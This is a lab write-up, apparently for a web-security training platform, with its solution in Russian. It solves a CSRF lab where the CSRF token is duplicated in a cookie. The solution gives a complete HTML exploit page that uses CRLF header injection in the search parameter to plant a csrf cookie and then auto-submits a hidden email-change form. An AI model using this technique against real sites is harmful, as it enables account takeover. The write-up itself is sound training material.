# CSRF where token is duplicated in cookie
PRACTITIONER

This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter

## Решение
Если отредактировать значение кукиса "csrf" и обновить страницу, то значение CSRF-токена также обновится соответствующим образом.

Кукис csrf может быть установлен посредством CRLFi в функционале поиска (подробнее об этом написано в описании [предыдущей лабы](../05-csrf-where-token-is-tied-to-non-session-cookie/README.md)):
```
<html>
<body>
    <form action="https://0aee004204f1cab3800562ba00780058.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="wiener123@normal-user.net" />
        <input required="" type="hidden" name="csrf" value="RjKJCHhC56GVPZgwAvBANld2KZlbeJDB" />
    </form>
    <img src="https://0aee004204f1cab3800562ba00780058.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=RjKJCHhC56GVPZgwAvBANld2KZlbeJDB%3b%20SameSite=None" onerror="document.forms[0].submit()" >
</body>
</html>
```
Задание выполнено.
